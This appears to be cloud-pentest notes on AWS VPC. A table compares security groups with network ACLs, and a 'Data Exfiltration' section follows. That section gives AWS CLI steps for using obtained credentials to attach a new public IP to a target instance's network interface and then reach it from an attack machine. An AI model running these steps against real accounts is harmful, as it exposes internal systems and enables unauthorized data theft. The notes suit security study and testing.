# VPC

## Security Group vs Network ACL

| Feature / Behavior                                    | Security Group                                                                                                    | Network ACL                                                                                                          |
|-------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| **Level of operation**                                | Instance level                                                                                                     | Subnet level                                                                                                          |
| **Rule types supported**                              | Allow rules only                                                                                                   | Allow and deny rules                                                                                                  |
| **Statefulness**                                      | Stateful – return traffic automatically allowed regardless of rules                                                | Stateless – return traffic must be explicitly allowed by rules                                                        |
| **Rule evaluation**                                   | All rules evaluated before deciding whether to allow traffic                                                       | Rules processed in order starting with the lowest numbered rule                                                       |
| **Application scope**                                 | Applies only if specified during launch or associated with an instance later                                       | Applies automatically to all instances in associated subnets                                                          |
| **Purpose**                                           | Primary instance-level traffic control                                                                             | Additional layer of defense if security group rules are too permissive                                                |

## Data Exfiltration

Prerequisites: AWS Credentials

### 1) Allocate a new public IP Address to the EC2 Instance in the account

AWS CLI or CloudShell

    aws ec2 allocate-address

### 2) Find the ENI (network interface) for the target machine.

    aws ec2 describe-instances > instances.json
    grep eni instances.json

### 3) Attach the public IP to the ENI of the target machine, by associating the AllocationId with the NetworkInterfaceId

    aws ec2 associate-address --network-interface-id eni-NETWORK_INTERFACE_ID --allocation-id eipalloc-ALLOCATION_ID

### 4) Ping the public IP for verification

Attack machine

    ping EC2_PUBLIC_IP
